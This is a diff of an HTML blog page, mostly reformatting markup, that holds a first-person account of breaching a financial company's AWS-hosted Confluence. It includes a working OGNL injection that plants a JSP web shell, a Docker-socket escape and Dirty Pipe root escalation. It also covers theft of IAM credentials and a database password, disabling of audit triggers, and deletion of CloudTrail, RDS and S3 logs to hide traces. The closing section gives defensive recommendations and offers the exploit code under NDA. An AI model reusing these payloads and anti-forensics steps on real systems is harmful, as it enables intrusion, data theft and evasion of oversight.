@@ -139,22 +139,23 @@
                         </div>
                         <div class="post-full-content" style="display: none;">
                             <div class="article-content">
-                                <h4>Goal</h4>
-                                <p>Gain full access to the critical systems of a large financial holding in the Fortune 500 list using publicly available vulnerabilities and configuration mistakes.</p>
+                                <p>Goal: gain full access to the critical systems of a large financial holding in the Fortune 500 list using publicly available vulnerabilities and configuration mistakes.</p>
 
-                                <h4>Environment</h4>
-                                <p>Confluence Server a web portal for internal documentation, running in a Docker container on an Amazon Linux 2 host. The entire cluster is managed via Kubernetes but Confluence is deployed as a standalone container on a separate EC2 instance.</p>
+                                <p>Environment: Confluence Server a web portal for internal documentation, running in a Docker container on an Amazon Linux 2 host. The entire cluster is managed via Kubernetes but Confluence is deployed as a standalone container on a separate EC2 instance.</p>
 
-                                <h4>Architecture (main components)</h4>
-                                <ol>
-                                    <li>Confluence Server 7.18.0 (Data Center & Server) listening on confluence.xxxx.xxxxx (public DNS, open to the entire internet)</li>
-                                    <li>Docker daemon on the host (/var/run/docker.sock is mounted inside the Confluence container to simplify log and backup operations)</li>
-                                    <li>EC2 instance running Amazon Linux 2 (kernel 5.10.x vulnerable to Dirty Pipe) with an IAM profile ConfluenceEC2Role having read permissions for S3, SSM, and RDS</li>
-                                    <li>Amazon RDS PostgreSQL 12.11 (production database) accessible only from a private subnet via a bastion host</li>
-                                    <li>AWS CloudTrail, configured as a multi-region trail named prod-cloudtrail</li>
-                                </ol>
+                                <p>Architecture (main components):</p>
 
-                                <p>Now let's go step by step to see how I achieved full control over all these elements using proven vulnerabilities and configuration oversights.</p>
+                                <p>Confluence Server 7.18.0 (Data Center & Server) listening on confluence.xxxx.xxxxx (public DNS, open to the entire internet)</p>
+
+                                <p>2. Docker daemon on the host (/var/run/docker.sock is mounted inside the Confluence container to simplify log and backup operations)</p>
+
+                                <p>3. EC2 instance running Amazon Linux 2 (kernel 5.10.x vulnerable to Dirty Pipe) with an IAM profile ConfluenceEC2Role having read permissions for S3, SSM, and RDS</p>
+
+                                <p>4. Amazon RDS PostgreSQL 12.11 (production database) accessible only from a private subnet via a bastion host</p>
+
+                                <p>5. AWS CloudTrail, configured as a multi-region trail named prod-cloudtrail</p>
+
+                                <p>Now let's go step by step to see how I achieved full control over all these elements using proven vulnerabilities and configuration oversights</p>
 
                                 <h4>1. Initial Breach: Confluence RCE via CVE-2022–26134</h4>
                                 
@@ -166,11 +167,9 @@
                                 <h5>Exploitation</h5>
                                 
                                 <h6>Information Gathering</h6>
-                                <ul>
-                                    <li>Public DNS: confluence.xxxxx.xxxxx → IP: 18.204.xxx.45</li>
-                                    <li>HTTP headers showed Apache Tomcat 9 and Confluence 7.18.0.</li>
-                                    <li>Found public Swagger documentation and discovered endpoints like /rest/tinymce/1/macro/preview listening without a CSRF token</li>
-                                </ul>
+                                <p>Public DNS: confluence.xxxxx.xxxxx ->IP: 18.204.xxx.45</p>
+                                <p>HTTP headers showed Apache Tomcat 9 and Confluence 7.18.0.</p>
+                                <p>Found public Swagger documentation and discovered endpoints like /rest/tinymce/1/macro/preview listening without a CSRF token</p>
 
                                 <h6>Constructing the OGNL Payload</h6>
                                 <p>There is a GitHub repository with a PoC for CVE-2022–26134 (for example, iskandev/CVE-2022-26134-Exploit)</p>
@@ -202,7 +201,7 @@
   -d '{"content":"${#@org.apache.commons.io">a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('bash -c \"echo \\"&lt;%%@ page import=\\"java.io.*\\" %%&gt;&lt;%% String cmd = request.getParameter(\\"cmd\\"); if(cmd!=null){ Process p = Runtime.getRuntime().exec(cmd); InputStream in = p.getInputStream(); int ch; while((ch=in.read()) != -1) out.print((char)ch); in.close(); } %%&gt;\\" &gt; /opt/atlassian/confluence/confluence/WEB-INF/classes/templates/pwn.jsp\"')).getInputStream(), 'UTF-8'), #context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').addHeader('X-Status','Uploaded')}" }' \
   "https://confluence.company.local/rest/tinymce/1/macro/preview"</code></pre>
                                 <p>Verified that visiting https://confluence.company.local/pwn.jsp?cmd=id returned uid=497(tomcat) gid=497(tomcat) groups=497(tomcat).</p>
-                                <p><strong>Outcome:</strong> I obtained a shell context on Confluence running as user tomcat (UID 497). Now I could move on to the next steps.</p>
+                                <p>Outcome: I obtained a shell context on Confluence running as user tomcat (UID 497). Now I could move on to the next steps.</p>
 
                                 <h4>2. Local Escalation on the Confluence Host: Discovering the Docker Socket and Container Privilege</h4>
                                 <p>In production, Confluence isn't deployed as a plain Tomcat service but inside a Docker container on an EC2 instance:</p>
@@ -227,12 +226,10 @@ docker version</code></pre>
   --name escape_container \
   ubuntu:20.04 \
   tail -f /dev/null</code></pre>
-                                <p><strong>What's happening:</strong></p>
-                                <ul>
-                                    <li>--rm ensures the container is removed when stopped.</li>
-                                    <li>Mounts the entire host filesystem (/) to /hostfs inside the container.</li>
-                                    <li>Mounts /var/run/docker.sock so that Docker CLI calls inside this container actually speak to the host's Docker daemon.</li>
-                                </ul>
+                                <p>What's happening:</p>
+                                <p>--rm ensures the container is removed when stopped.</p>
+                                <p>Mounts the entire host filesystem (/) to /hostfs inside the container.</p>
+                                <p>Mounts /var/run/docker.sock so that Docker CLI calls inside this container actually speak to the host's Docker daemon.</p>
                                 <p>Now, by running docker exec -it escape_container bash, I had root access (UID 0) inside the container. More importantly, this container could interact with the host (through /hostfs and Docker CLI, since the socket is seen as "root").</p>
 
                                 <h5>2.3 Gaining Full Root on the Host</h5>
@@ -264,6 +261,7 @@ sed -i 's/ec2-user:[^:]*:/ec2-user:$6$abcdefghijklmnopqrstuvwx:/' /hostfs/etc/sh
 cd dirty-pipe-exploit
 make</code></pre>
                                 <p>This produced an executable dirtypipe binary, which lets you write arbitrary data to any file mounted with O_RDONLY on a vulnerable kernel.</p>
+                                <p>Become a member</p>
                                 <p>Copied it to the host via /hostfs:</p>
                                 <pre><code>cp dirtypipe /hostfs/tmp/dirtypipe
 chmod +x /hostfs/tmp/dirtypipe</code></pre>
@@ -284,10 +282,11 @@ sudo /tmp/dirtypipe /etc/passwd /tmp/fakeentry $OFFSET</code></pre>
                                 <p>After this, ec2-user had UID 0 and GID 0 (i.e., became a superuser). Verified:</p>
                                 <pre><code>id ec2-user
 # Output: uid=0(ec2-user) gid=0(root) groups=0(root),497(tomcat) ...</code></pre>
-                                <p><strong>Outcome:</strong> I fully turned ec2-user into a root-level account. From that point, I could run any command as root on the host without restriction.</p>
+                                <p>Outcome:</p>
+                                <p>I fully turned ec2-user into a root-level account. From that point, I could run any command as root on the host without restriction.</p>
 
                                 <h4>4. Harvesting AWS IAM Credentials via the Metadata API (IMDSv2)</h4>
-                                <p><strong>Goal:</strong> retrieve the IAM role attached to the EC2 instance and use it to access S3, SSM, and RDS.</p>
+                                <p>Goal: retrieve the IAM role attached to the EC2 instance and use it to access S3, SSM, and RDS.</p>
 
                                 <h5>4.1 Requesting an IMDSv2 Token</h5>
                                 <p>On the host (as root):</p>
@@ -386,7 +385,7 @@ aws s3 cp s3://company-logs-prod/2025-05/httpd-2025-05-28.tar.gz /tmp/ --profile
                                 <p>On my local machine (or directly on the bastion), ran:</p>
                                 <pre><code>psql -h localhost -U app_admin -d proddb</code></pre>
                                 <p>Entered 5up3rP455! and the connection succeeded, confirming the correct app_admin credentials.</p>
-                                <p><strong>Outcome:</strong> Access to the database was established, granting the ability to run SQL queries.</p>
+                                <p>Outcome: Access to the database was established, granting the ability to run SQL queries.</p>
 
                                 <h4>6. Disabling Auditing and Exfiltrating Data from PostgreSQL</h4>
 
@@ -416,18 +415,14 @@ ALTER TABLE twofa_secrets DISABLE TRIGGER ALL;</code></pre>
                                 <h5>7.1 Clearing PostgreSQL Logs (RDS Logs)</h5>
                                 <p>By default, RDS PostgreSQL sends logs to CloudWatch Logs (not the host file). In this case, RDS was configured to send logs both to S3 (backup buckets) and to CloudWatch.</p>
                                 <p>To "erase" traces, I did the following:</p>
-                                <ol>
-                                    <li><strong>Temporarily disable log exports</strong></li>
-                                </ol>
+                                <p>Temporarily disable log exports</p>
                                 <pre><code>aws rds modify-db-instance \
   --db-instance-identifier prod-db-instance \
   --no-enable-cloudwatch-logs-exports \
   --apply-immediately \
   --profile confluence-ec2-role</code></pre>
                                 <p>This stopped the postgresql logs from flowing to CloudWatch for a few seconds.</p>
-                                <ol start="2">
-                                    <li><strong>Deleting S3 logs</strong></li>
-                                </ol>
+                                <p>2. Deleting S3 logs</p>
                                 <pre><code>aws s3 rm s3://company-logs-prod/2025-05/httpd-2025-05-28.tar.gz --profile confluence-ec2-role</code></pre>
                                 <p>Removed the web access logs that showed my entry with pwn.jsp?cmd=…</p>
 
@@ -441,25 +436,27 @@ aws cloudtrail start-logging --name prod-cloudtrail --profile confluence-ec2-rol
 
                                 <h4>8. Final Control and Conclusions</h4>
 
-                                <h5>1. Full Control of the Host and RDS</h5>
-                                <ul>
-                                    <li>Dirty Pipe gave me root on the EC2 instance.</li>
-                                    <li>Via IMDSv2, I retrieved IAM credentials with S3/SSM/RDS permissions.</li>
-                                    <li>I dumped the production database and extracted all confidential data (users, transactions, 2FA secrets).</li>
-                                </ul>
+                                <p>1. Full Control of the Host and RDS</p>
+                                <p>Dirty Pipe gave me root on the EC2 instance.</p>
+                                <p>Via IMDSv2, I retrieved IAM credentials with S3/SSM/RDS permissions.</p>
+                                <p>I dumped the production database and extracted all confidential data (users, transactions, 2FA secrets).</p>
 
-                                <h5>2. Access to S3 and Confidential Logs</h5>
+                                <p>2. Access to S3 and Confidential Logs</p>
                                 <p>I now have permanent access to company-logs-prod (S3), where DevOps typically store all web logs and backups. These logs can be automated and sent to another AWS environment regularly.</p>
 
-                                <h5>3. Recommendations for Fortune 500 DevSecOps</h5>
-                                <ul>
-                                    <li><strong>Immediately update Confluence to ≥ 7.18.1.</strong> CVE-2022–26134 allows RCE even without credentials; it's fixed in 7.18.1.</li>
-                                    <li><strong>Remove /var/run/docker.sock mounting from Confluence containers.</strong> Never give a web application direct Docker socket access. Use a centralized logging service (Fluentd/CloudWatch Agent) instead.</li>
-                                    <li><strong>Ensure your EC2 isn't vulnerable to Dirty Pipe.</strong> Amazon Linux 2 (kernel 5.10.x up to 5.10.102) is vulnerable to CVE-2022–0847. Apply patches or update the kernel to ≥ 5.10.102 (or migrate to Amazon Linux 2023).</li>
-                                    <li><strong>Use an IAM Instance Profile instead of static AWS keys.</strong> The ConfluenceEC2Role shouldn't have excessive permissions (minimize access). Never store static AWS keys in scripts.</li>
-                                    <li><strong>Restrict Network ACLs and Security Groups.</strong> The bastion host should be the only path to the private VPC. Make sure RDS instances are not directly accessible from the internet.</li>
-                                    <li><strong>Load DevSecOps alerting systems.</strong> Disabling CloudTrail or RDS logs should automatically trigger email/SMS/Slack notifications.</li>
-                                </ul>
+                                <p>3. Recommendations for Fortune 500 DevSecOps</p>
+                                <p>Immediately update Confluence to ≥ 7.18.1.</p>
+                                <p>CVE-2022–26134 allows RCE even without credentials; it's fixed in 7.18.1.</p>
+                                <p>Remove /var/run/docker.sock mounting from Confluence containers.</p>
+                                <p>Never give a web application direct Docker socket access. Use a centralized logging service (Fluentd/CloudWatch Agent) instead.</p>
+                                <p>Ensure your EC2 isn't vulnerable to Dirty Pipe.</p>
+                                <p>Amazon Linux 2 (kernel 5.10.x up to 5.10.102) is vulnerable to CVE-2022–0847. Apply patches or update the kernel to ≥ 5.10.102 (or migrate to Amazon Linux 2023).</p>
+                                <p>Use an IAM Instance Profile instead of static AWS keys.</p>
+                                <p>The ConfluenceEC2Role shouldn't have excessive permissions (minimize access). Never store static AWS keys in scripts.</p>
+                                <p>Restrict Network ACLs and Security Groups.</p>
+                                <p>The bastion host should be the only path to the private VPC. Make sure RDS instances are not directly accessible from the internet.</p>
+                                <p>Load DevSecOps alerting systems.</p>
+                                <p>Disabling CloudTrail or RDS logs should automatically trigger email/SMS/Slack notifications.</p>
 
                                 <p>If you need PoC scripts or step-by-step details (for example, exact OGNL payloads, Dirty Pipe scripts) contact me directly I can share the code under NDA.</p>
                             </div>
